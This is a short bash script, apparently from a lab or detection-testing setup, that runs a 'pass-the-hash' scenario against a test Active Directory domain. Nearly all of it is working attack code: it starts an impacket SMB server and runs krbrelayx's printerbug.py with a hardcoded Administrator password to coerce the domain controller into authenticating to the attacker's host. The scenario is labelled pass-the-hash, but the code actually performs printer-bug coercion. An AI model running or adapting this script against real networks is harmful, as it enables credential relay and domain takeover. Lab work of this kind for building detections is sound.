#!/bin/bash

set -euo pipefail

DOMAIN="LAB"
DC_IP="10.99.10.10"
DC_ADMIN_PASSWORD="P@ssw0rd!"
SELF_IP="10.99.20.30"
SCENARIO_ID="${1:-passthehash_printerbug}"
LOG_FILE="scenario.log"

START_TIME="$(date -Is)"
echo "${START_TIME},scenario=${SCENARIO_ID},type=passthehash,status=start,domain=${DOMAIN},dc_ip=${DC_IP}" >> "${LOG_FILE}"

echo "[*] ${START_TIME}: Sākts Pass-the-Hash scenārijs ${SCENARIO_ID}"
echo "[*] Domēns: ${DOMAIN} DC: ${DC_IP}"

impacket-smbserver labshare /tmp/smb -smb2support &
SMB_PID=$!
python krbrelayx/printerbug.py ${DOMAIN}/Administrator:"${DC_ADMIN_PASSWORD}"@${DC_IP} ${SELF_IP}

END_TIME="$(date -Is)"
echo "${END_TIME},scenario=${SCENARIO_ID},type=passthehash,status=end,domain=${DOMAIN},dc_ip=${DC_IP}" >> "${LOG_FILE}"

cleanup() {
    kill "$SMB_PID" 2>/dev/null
}
trap cleanup EXIT

echo "[*] ${END_TIME}: Pabeigts scenārijs ${SCENARIO_ID}"

